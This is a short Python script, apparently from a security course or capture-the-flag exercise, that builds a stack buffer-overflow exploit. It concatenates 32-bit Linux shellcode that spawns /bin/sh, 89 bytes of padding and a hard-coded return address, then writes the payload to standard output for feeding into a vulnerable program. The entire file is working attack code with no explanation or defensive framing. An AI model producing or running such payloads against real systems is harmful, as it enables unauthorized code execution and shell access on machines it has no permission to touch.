#!/usr/bin/python3
from struct import pack
#from shellcode import shellcode
import sys

shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
ret_addr = pack("<I",0xfffef93c)
#print(shellcode)
padding = b'A'*89
attack_str = b"\xbc\x89\xfe\xff"

#print(shellcode + padding + attack_str)
sys.stdout.buffer.write(shellcode + padding + attack_str)
